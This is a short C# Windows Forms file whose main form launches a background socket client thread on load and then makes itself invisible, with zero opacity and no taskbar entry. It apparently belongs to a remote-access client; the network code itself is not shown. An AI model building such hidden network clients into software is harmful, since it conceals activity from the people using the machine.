using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Client
{
    public partial class Main : Form
    {
        private readonly Client.SocketClient socketClient;
        public Main()
        {
            socketClient = new Client.SocketClient();
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Thread clientThread = new Thread(socketClient.ExecuteClient);
            clientThread.IsBackground = true;
            clientThread.Start();

            // Start hidden.
            Opacity = 0.0f;
            ShowInTaskbar = false;
            MinimizeBox = true;
        }
    }
}